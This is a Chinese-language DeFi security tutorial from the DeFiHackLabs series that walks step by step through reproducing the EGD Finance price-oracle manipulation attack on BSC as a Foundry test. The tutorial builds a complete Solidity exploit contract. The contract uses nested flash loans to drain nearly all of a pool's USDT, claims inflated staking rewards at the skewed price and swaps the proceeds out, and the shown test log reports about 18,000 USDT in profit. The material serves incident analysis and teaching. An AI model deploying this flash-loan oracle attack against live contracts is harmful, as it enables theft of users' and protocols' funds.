# OnChain Transaction Debugging: 3. Write Your Own PoC

Author: [▓▓▓▓▓▓](https://twitter.com/h0wsO1)

社群 [Discord](https://discord.gg/3y3d9DMQ)

同步发表: XREX | WTF Academy 

在 [01_Tools](/tutorials/onchain_debug/01_tools/readme.md) 教学中，我们学到了如何使用 Debug Tools 来观察一笔交易和智能合约互动的过程。

在 [02_Warm](/tutorials/onchain_debug/02_warm/readme.md) 教学中，我们实际分析了一笔与 DEX 互动的交易，并且使用 Foundry 与 DEX 互动。

在本次教学中，我们将带你实际分析一个攻击事件，并逐步带你利用 Foundry 测试框架撰写代码，完成 Reproduce PoC。

## 为什么学习撰写 Reproduce PoC 很重要？

DeFiHackLabs 期望更多人可以关注 Web3 安全，当攻击事件发生时，有更多人可以一起分析事件原因，为安全网路做出贡献。

1. 作为甲方，锻炼事件响应 (incident response) 的能力。
2. 作为乙方，锻炼威胁研究分析能力以及 Bug bounty 写 PoC 的技能，获得更有竞争力的赏金报酬。
3. 帮助蓝队更好的调校机器学习模型，例如 [Forta Network](https://forta.org/blog/how-fortas-predictive-ml-models-detect-attacks-before-exploitation/)。
4. 比起阅读安全机构的验尸报告，自己撰写 Reproduce 更能深刻理解骇客的攻击思路。
5. 锻炼 Solidity 编程熟悉度，区块链本质上就是个庞大的公开资料库。

## 在学习撰写 Reproduce PoC 之前，会需要具备的知识

1. 暸解常见智能合约漏洞样态，可以参考 [DeFiVulnLabs](https://github.com/SunWeb3Sec/DeFiVulnLabs) 进行练习。
2. 暸解 DeFi 基础建设如何运作，以及智能合约与智能合约之间如何互动。

## 价格预言机原理简介

在区块链的世界中，智能合约的状态变量与参数都是与世隔离的，智能合约没办法像传统胖应用一样能够做到自启动、自行透过 API 抓取价格资讯等操作。

智能合约要取得外部资料，通常有两种作法：

1. 有一个实体 EOA，进行主动喂价。
2. 使用预言机，也就是"参照某个智能合约所储存的参数，作为喂价资讯"。

举一个例子：我有一个借贷合约，它想要取得 ETH 的价格来判断借款人的部位是否可以被清算，我可以怎么做？

在这个例子中，ETH 的价格是外部资料。

借贷合约想要取得 ETH 的价格资料，它可以向 Uniswap V2 获取 ETH 价格资讯。

我们知道 `x * y = k` AMM 算法中，x 代币的价格 = `k / y`。

所以，我们若想取得 ETH 的价格，可以找到 Uniswap V2 WETH/USDC 交易对合约: `0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc`。

![UniV2PairInfo](https://user-images.githubusercontent.com/26408530/211231355-0d1fb43e-280e-4328-b71e-9797be5ce7ec.png)

本文撰写时，该合约的代币储备量：

WETH: `33,906.6145928` 颗
USDC: `42,346,768.252804` 颗

我们套用 `x * y = k` 公式，就可以知道每颗 ETH 对应 USDC 的价格：

`42,346,768.252804 / 33,906.6145928 = 1248.9235`

(存在细微差距，通常代表交易手续费收入或是有人意外转入代币，可被 `skim()` 取走)

所以，套利合约若想要取得 ETH 的价格，Solidity Pseudocode 大致可以理解成：

```solidity=
uint256 UniV2_ETH_Reserve = WETH.balanceOf(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc);
uint256 UniV2_USDC_Reserve = USDC.balanceOf(0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc);
uint256 ETH_Price = UniV2_USDC_Reserve / UniV2_ETH_Reserve;
```

> 请注意，这种写法容易被操纵预言机价格，请不要在生产环境这么做。

如果需要详细暸解 Uniswap V2 算法原理，推荐参考 [Smart Contract Programmer 教学影片](https://www.youtube.com/watch?v=Ar4Ik7Bov0U)。

如果需要详细暸解价格预言机操纵原理，推荐参考 [WTFSolidity 教学文章](https://github.com/WTFAcademy/WTF-Solidity/blob/main/S15_OracleManipulation/readme.md)。


## 现实中的价格操纵案例

大多数攻击场景为：

1. 调换价格预言机地址
    - 根本原因: 特权操作缺乏身份验证机制
    - 案例: [Rikkei Finance](https://github.com/SunWeb3Sec/DeFiHackLabs#20220415-rikkei-finance---access-control--price-oracle-manipulation)
2. 攻击者透过闪电贷，瞬间抽走预言机的流动性，使受害合约取得异常的价格资讯
    - 此漏洞常在 GetPrice、Swap、StackingReward、Transfer(with burn fee) 等关键功能被利用
    - 根本原因: 项目方使用了不安全的预言机，或是未实现 TWAP 时间加权平均价格。
    - 案例: [One Ring Finance](https://github.com/SunWeb3Sec/DeFiHackLabs#20220321-onering-finance---flashloan--price-oracle-manipulation)

> Tips: 在进行 Code Review 时，最好注意 `balanceOf()` 使用上是否足够严谨。

## 手把手撰写 PoC - 以 EGD Finance 为例

### Step1: Infomation gathering

当攻击发生时，通常 Twitter 会是安全分析师的主战场，会有各路大佬在 Twitter 上发布自己对于攻击事件的最新发现。

> Tips: 加入 [DeFiHackLabs Discord](https://discord.gg/vG4FePvr) security-alert 频道，即时收到各路 DeFi 安全大佬们的消息！

攻击事件刚发生时，肯定是各种混乱，先找个文件整理你所发现到的资讯吧！

1. Transaction ID
2. Attacker Address(EOA)
3. Attack Contract Address
4. Vulnerable Address
5. Total Loss
6. Reference Links
7. Post-mortem Links
8. Vulnerable snippet
9. Audit History

> Tips: 建议使用 DeFiHackLabs 提供的 [Exploit-Template.sol](script/Exploit-template.sol) 模板。

---

### Step2: Transaction Debugging

根据过往观察，大约攻击发生后 12 小时，通常各路资讯对于攻击事件分析都梳理出 90% 以上了，此时手动进行交易分析都不会太困难。

我们之所以使用 EGD Finance 作为教学范例，原因是：

1. 读者可以透过真实环境中学习价格预言机操纵风险
2. 读者可以理解攻击者如何透过价格操纵获利
3. 读者可以顺便学到闪电贷运作原理
4. 攻击者只使用一个 Transaction 完成攻击，没有复杂的前置动作，Reproduce 较简单

让我们使用 Blocksec 开发的 Phalcon 工具来分析 EGD Finance 攻击事件，[分析连结](https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3)。

<img width="1736" alt="PhalconOverview" src="https://user-images.githubusercontent.com/26408530/211231413-25e31110-4e3a-41c7-9dbb-d9fdc3a0e8da.png">

在 Ethereum Virtual Machine 中，你会看到三种调用方式：

1. Call: 一般的跨合约函数调用方式，这通常会改变被调用合约的存储
2. StaticCall: 静态调用，不会改变被调用合约的存储，是属于跨合约读取状态变数的操作。
3. DelegateCall: 委任调用，`msg.sender` 不会改变，通常用于 Proxy 代理模式，详细说明可以参考 [WTFSolidity 教程](https://github.com/WTFAcademy/WTF-Solidity/tree/main/23_Delegatecall)。

请注意，Internal Function Call 是看不到的。

---

闪电贷攻击套路通常是:

1. 确认可从 DEX 借走的余额，以及确认受害者合约有足够的余额使攻击者获利
    - 这意味著在 Tx 前半部会有一些 Static Call
2. 呼叫借贷函数，从 DEX 或 Landing Protocol 收到闪电贷款
    - 重点: 寻找以下 Function Call
    - UniswapV2, Pancakeswap: `.swap()`
    - Balancer: `flashLoan()`
    - DODO: `.flashloan()`
    - AAVE: `.flashLoan()`
3. 借贷平台回调攻击者合约
    - 重点: 寻找以下 Function Call
    - UniswapV2: `.uniswapV2Call()`
    - Pancakeswap: `.Pancakeswap()`
    - Balancer: `.receiveFlashLoan()`
    - DODO: `.DXXFlashLoanCall()`
    - AAVE: `.executeOperation()`
4. 攻击者与受害合约互动，利用漏洞获利
5. 闪电贷还款
    - 主动还款
    - 设定 approve，让借贷平台用 `transferFrom()` 取走借款。

小练习: 你能定位出 EGD Finance Exploit Transaction 各个阶段在哪吗？试著找出闪电贷、回调函数、漏洞利用、了结获利在哪。

`Expand Level: 3`

https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3

<img width="1898" alt="TryToDecodeFromYourEyes" src="https://user-images.githubusercontent.com/26408530/211231441-b5cd2cd8-a438-4344-b014-6b8e92ab2532.png">

> Tips: 实战时，尚无法理清整个 Transaction 的攻击逻辑的时候，可以先试著从最开始一步一步拷贝攻击者的 CALL 足迹，多做笔记，再回过头整理攻击者的思路。

<details><summary>解答</summary>

<img width="1898" alt="TryToDecodeFromYourEyesAnwser" src="https://user-images.githubusercontent.com/26408530/211231457-74b3ba87-45fc-4fe0-ace2-678247f00f58.png">

</details>

---

截至目前为止，我们已对攻击 Tx 有初步轮廓，让我们根据现有发现，完成一部分 Reproduce Code 吧:

Step1. 完成 fixtures

<details><summary>点我展开代码</summary>

```solidity=
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : ~36,044 US$
// Attacker : 0xee0221d76504aec40f63ad7e36855eebf5ea5edd
// Attack Contract : 0xc30808d9373093fbfcec9e026457c6a9dab706a7
// Vulnerable Contract : 0x34bd6dba456bc31c2b3393e499fa10bed32a9370 (Proxy)
// Vulnerable Contract : 0x93c175439726797dcee24d08e4ac9164e88e7aee (Logic)
// Attack Tx : https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code#F1#L254
// Stake Tx : https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

// @Analysis
// Blocksec : https://twitter.com/BlockSecTeam/status/1556483435388350464
// PeckShield : https://twitter.com/PeckShieldAlert/status/1556486817406283776

// 宣告全局变量, 必须为 constant 类型
CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;

contract Attacker is Test { // 模拟的攻击者(EOA)
    Exploit exploit = new Exploit();

    constructor() { // 也可以写成 function setUp() public {}
        // label 可以将钱包地址标签化，方便在使用 forge test -vvvv 时提高可读性
        cheat.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        cheat.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(EGD_Finance, "EGD_Finance");
        cheat.label(usdt, "USDT");
        cheat.label(egd, "EGD");
        /* ------------------------------------------------------------------------------------------- */
        cheat.roll(20245539); //注意: 必须 fork 攻击 tx 的前一个 block, 因为此时受害合约状态尚未改变!!
        console.log("-------------------------------- Start Exploit ----------------------------------");
    }
}
```

</details>
<br>

Step2. 模拟攻击者调用 harvest 函数

<details><summary>点我展开代码</summary>

```solidity=
contract Attacker is Test { // 模拟的攻击者(EOA)
    Exploit exploit = new Exploit();

    constructor() {
        // label 可以将钱包地址标签化，方便在使用 forge test -vvvv 时提高可读性
        cheat.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        cheat.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        cheat.label(address(pancakeRouter), "pancakeRouter");
        cheat.label(EGD_Finance, "EGD_Finance");
        cheat.label(usdt, "USDT");
        cheat.label(egd, "EGD");
        /* ------------------------------------------------------------------------------------------- */
        cheat.roll(20245539); //注意: 必须 fork 攻击 tx 的前一个 block, 因为此时受害合约状态尚未改变!!
        console.log("-------------------------------- Start Exploit ----------------------------------");
    }
 
    function testExploit() public { // 必须为 test 开头命名, 才能被 Foundry 执行 testcase
        // 攻击前, 先 print 出余额, 已便于更好的观察 balance 变化
        emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[INFO] EGD/USDT Price before price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
        emit log_named_decimal_uint("[INFO] Current earned reward (EGD token)", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18);
        
        console.log("Attacker manipulating price oracle of EGD Finance...");
        exploit.harvest(); //模拟 EOA 呼叫攻击合约
        console.log("-------------------------------- End Exploit ----------------------------------");
        emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
    }
}
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function calculateAll(address addr) external view returns (uint);
}
```

</details>
<br>

Step3. 完成一部分的攻击合约

<details><summary>点我展开代码</summary>

```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // 攻击合约
    uint256 borrow1;

    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //获利了结
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        // 漏洞利用...

        // 漏洞利用结束, 把盗取的 EGD Token 换成 USDT
        console.log("Swap the profit...");
        address[] memory path = new address[](2);
        path[0] = egd;
        path[1] = usdt;
        IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(egd).balanceOf(address(this)),
            1,
            path,
            address(this),
            block.timestamp
        );

        bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //攻击者还款 2,000 USDT + 0.5% 服务费
        require(suc, "Flashloan[1] payback failed");
    }
}
```

</details>
<br>

---

让我们继续分析关键的漏洞利用部分...

我们可以看到在漏洞利用部分，攻击者再次呼叫了 `Pancakeswap.swap()`，似乎是进行第二层的闪电贷：

![Flashloan2](https://user-images.githubusercontent.com/26408530/211231489-4977bc1d-4ed0-45f8-b014-8de92942fe4f.png)

你可能会疑惑：Pancakeswap 都是透过 `.pancakeCall()` 介面回调攻击者的合约，攻击者是如何在两次回调中，执行不同的代码逻辑呢？

关键在于第一次闪电贷，攻击合约带入的 callbackData 是 `0x0000`

![FlashloanCallbackData1](https://user-images.githubusercontent.com/26408530/211231501-7b8e508a-a6fe-4f28-9308-5406d0dec32f.png)

而第二次闪电贷，攻击合约带入的 callbackData 是 `0x00`

![FlashloanCallbackData2](https://user-images.githubusercontent.com/26408530/211231506-e76cc110-3969-486d-b917-7ddec3d46ee5.png)

透过这种方式，攻击合约只需要判断 `_data` 参数是 0x0000 还是 0x00 即可执行不同的代码逻辑。

让我们继续分析第二层闪电贷回调的执行逻辑。

在第二层闪电贷回调，攻击者与 EGD Finance 互动，仅呼叫了 `claimAllReward()` 函数：

![CallClaimReward](https://user-images.githubusercontent.com/26408530/211231522-a54ef929-63e3-4b9c-8f0c-e609c2055b2c.png)

将 `claimAllReward()` 展开，会发现 EGD Finance 仅仅是读了 `0xa361-Cake-LP` 的 EGD Token 余额以及 USDT 余额，就将大量的 EGD Token 转出给攻击合约了！

![ClaimRewardDetail](https://user-images.githubusercontent.com/26408530/211231532-d9b0e7ce-ee65-48fb-a2eb-6fccbb799234.png)

<details><summary>0xa361-Cake-LP是什么合约？</summary>

我们可以透过 Etherscan 看 `0xa361-Cake-LP` 究竟是对应哪一个交易对。

方法一：直接在 [Etherscan](https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d) 看该合约的前二个最大储备量 Token (快速)

![Etherscan-Top2](https://user-images.githubusercontent.com/26408530/211231654-613672c0-400d-4e53-891c-4c309d8ce84c.png)

方法二：[Read Contract](https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d#readContract) 看 token0, token1 的地址 (准确)

<img width="404" alt="Etherscan-ReadContract" src="https://user-images.githubusercontent.com/26408530/211231545-43777f4e-6433-4dba-b2dc-ab54cd7aaeed.png">

现在，我们可以知道 `0xa361-Cake-LP` 指的是 EGD/USDT 交易对合约。

</details>
<br>

让我们分析 `claimAllReward()` 函数，看看漏洞在哪里。

<img width="1518" alt="ClaimRewardCode" src="https://user-images.githubusercontent.com/26408530/211231553-770e01d9-d809-43e1-99df-8674b0b30c8c.png">

我们可以发现到，使用者领取的 Staking Reward 数量，取决于奖励因子 `quota` (代表用户 Staking 多少代币、Staking 多久时间) 乘上 `getEGDPrice()` 目前 EGD Token 的价格。

也就是说，合约给出的 EGD Staking Reward 会按照目前的 EGD Token 市价给予更多或更少的 Token 数量，**当 EGD Token 价格越高，则给予的 EGD Token 数量越少，当 EGD Token 价格越低，则给予的 EGD Token 数量越多**。

我们跟进 `getEGDPrice()` 函数，分析喂价机制：

<img width="529" alt="getEGDPrice" src="https://user-images.githubusercontent.com/26408530/211231565-596b32d8-cbb9-4f59-a53e-77d837d2766c.png">

可以看到喂价机制是采用 `x * y = k` 的公式，就如同我们在 ***价格预言机原理简介*** 描述的一样。

`pair` 地址即是 `0xa361-Cake-LP`，这也就能和我们在 Tx View 中看到的两组 STATICCALL 配对起来了。

![getEGDPrice_Static](https://user-images.githubusercontent.com/26408530/211231574-bb7a652d-3538-4ca1-859d-a30962014d44.png)

那么具体上来说，攻击者是如何利用这个不安全的价格参考进行价格操纵呢？

原理是，攻击者在第二层闪电贷，向 `EGD/USDT Pair` 借出 USDT；在攻击者还款之前，`getEGDPrice()` 取得到的价格资讯就会是不正确的。

参考示意图：

<img width="840" alt="PriceManipulationGraph" src="https://user-images.githubusercontent.com/26408530/211231586-305cd6f2-ddd3-42aa-8a4c-5ec5a7a40dd6.png">

**总结：攻击者透过闪电贷，抽走价格预言机的流动性，使 `ClaimReward()` 获取到不正确的价格参考，进而使攻击者可以领取到异常大量的 EGD Token。**

攻击者利用漏洞取得大量 EGD Token 后，将 EGD Token 透过 Pancakeswap 换回 USDT，获利了结。

---

截至目前为止，我们已完整分析攻击原理，让我们完成 Reproduce Code：


Step4. 完成第一次闪电贷的逻辑代码

<details><summary>点我展开代码</summary>

```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // 攻击合约
    uint256 borrow1;
    uint256 borrow2;


    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //获利了结
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        if(keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");

            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000; //攻击者借出 EGD_USDT_LPPool 的 99.99999925% USDT 流动性
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00"); // Borrow Flashloan[2]
            console.log("Flashloan[2] payback success");

            // 漏洞利用结束, 把盗取的 EGD Token 换成 USDT
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)),
                1,
                path,
                address(this),
                block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //攻击者还款 2,000 USDT + 0.5% 服务费
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            // 漏洞利用...
        }


    }
}
```

</details>
<br>


Step5. 完成第二次闪电贷(漏洞利用)的逻辑代码

<details><summary>点我展开代码</summary>

```solidity=
/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */
contract Exploit is Test{ // 攻击合约
    uint256 borrow1;
    uint256 borrow2;


    function harvest() public {        
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        borrow1 = 2000 * 1e18;
        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");
        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); //获利了结
    }

    
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        console.log("Flashloan[1] received");

        if(keccak256(data) == keccak256("0000")) {
            console.log("Flashloan[1] received");

            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000; //攻击者借出 EGD_USDT_LPPool 的 99.99999925% USDT 流动性
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00"); // Borrow Flashloan[2]
            console.log("Flashloan[2] payback success");

            // 漏洞利用结束, 把盗取的 EGD Token 换成 USDT
            console.log("Swap the profit...");
            address[] memory path = new address[](2);
            path[0] = egd;
            path[1] = usdt;
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(egd).balanceOf(address(this)),
                1,
                path,
                address(this),
                block.timestamp
            );

            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); //攻击者还款 2,000 USDT + 0.5% 服务费
            require(suc, "Flashloan[1] payback failed");
        } else {
            console.log("Flashloan[2] received");
            emit log_named_decimal_uint("[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
            // -----------------------------------------------------------------
            console.log("Claim all EGD Token reward from EGD Finance contract");
            IEGD_Finance(EGD_Finance).claimAllReward();
            emit log_named_decimal_uint("[INFO] Get reward (EGD token)", IERC20(egd).balanceOf(address(this)), 18);
            // -----------------------------------------------------------------
            uint256 swapfee = amount1 * 3 / 1000;   // Attacker pay 0.3% fee to Pancakeswap
            bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), amount1+swapfee);
            require(suc, "Flashloan[2] payback failed");         
        }
    }
}
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function calculateAll(address addr) external view returns (uint);
    function claimAllReward() external;
    function getEGDPrice() external view returns (uint);
}
```

</details>
<br>

若一切顺利，命令列 `forge test --contracts ./src/test/EGD-Finance.exp.sol -vvv` 就可以看到 Reproduce 执行结果与 Balance 变化了。

[DeFiHackLabs - EGD-Finance.exp.sol](/src/test/EGD-Finance.exp.sol)

```
Running 1 test for src/test/EGD-Finance.exp.sol:Attacker
[PASS] testExploit() (gas: 537204)
Logs:
  --------------------  Pre-work, stake 10 USDT to EGD Finance --------------------
  Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8
  Attacker Stake 10 USDT to EGD Finance
  -------------------------------- Start Exploit ----------------------------------
  [Start] Attacker USDT Balance: 0.000000000000000000
  [INFO] EGD/USDT Price before price manipulation: 0.008096310933284567
  [INFO] Current earned reward (EGD token): 0.000341874999999972
  Attacker manipulating price oracle of EGD Finance...
  Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve
  Flashloan[1] received
  Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve
  Flashloan[2] received
  [INFO] EGD/USDT Price after price manipulation: 0.000000000060722331
  Claim all EGD Token reward from EGD Finance contract
  [INFO] Get reward (EGD token): 5630136.300267721935770000
  Flashloan[2] payback success
  Swap the profit...
  Flashloan[1] payback success
  -------------------------------- End Exploit ----------------------------------
  [End] Attacker USDT Balance: 18062.915446991996902763

Test result: ok. 1 passed; 0 failed; finished in 1.66s
```

> 注: DeFiHackLabs 提供的 EGD-Finance.exp.sol 有 Reproduce 攻击者的前置 Stacking 作业。
>
> 本教程未涵盖到前置动作，你可以自己练习看看！
> Attacker Stack Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8

第三课分享就先到这边，想学更多可以参考以下学习资源。
---
## 学习资源
[samczsun's eth txn explorer and vscode extension](https://www.youtube.com/watch?v=HXgu239mPBc)

[Vulnerabilities in DeFi by Daniel V.F.](https://www.youtube.com/watch?v=9fcOffCg2ig)

[Tenderly.co - Debug Transaction](https://www.youtube.com/watch?v=90GN9Ut8LhU)

[Reversing The EVM: Raw Calldata](https://degatchi.com/articles/reading-raw-evm-calldata)

https://web3sec.xrex.io/
